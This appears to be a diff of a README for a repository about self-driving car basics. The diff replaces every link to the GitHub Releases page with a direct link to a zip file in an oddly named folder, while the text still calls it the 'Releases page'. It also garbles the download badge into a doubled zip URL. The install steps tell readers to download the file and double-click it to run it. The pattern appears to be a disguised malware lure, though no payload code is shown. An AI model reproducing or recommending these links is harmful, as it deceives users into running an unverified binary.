@@ -1,6 +1,6 @@
 # 🚗 Self_Driving_Cars_Fundamentals - Learn Self-Driving Car Basics Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases)
+[![Download](https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip%https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip)](https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip)
 
 ## 📦 Introduction
 
@@ -10,14 +10,14 @@ Welcome to the **Self_Driving_Cars_Fundamentals** project. This application prov
 
 To get started with the application, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip).
 2. Click on the latest release to find the downloadable files.
 
 ## 📥 Download & Install
 
 To download the software:
 
-1. Go to the [Releases page](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip).
 2. You will see a list of available files. Choose the version suitable for your operating system.
 3. Once downloaded, locate the file in your downloads folder.
 4. Double-click the file to run the installation. Follow any prompts to complete the setup.
@@ -82,6 +82,6 @@ For questions or issues, please reach out through the GitHub Issues page. We aim
 
 ## 📈 Updates
 
-Stay tuned for updates and new features! Visiting our [Releases page](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases) regularly will ensure you have the latest version.
+Stay tuned for updates and new features! Visiting our [Releases page](https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip) regularly will ensure you have the latest version.
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases)
+[![Download](https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip%https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip)](https://raw.githubusercontent.com/Nadin550/Self_Driving_Cars_Fundamentals/main/nonexpansively/Self_Driving_Cars_Fundamentals.zip)
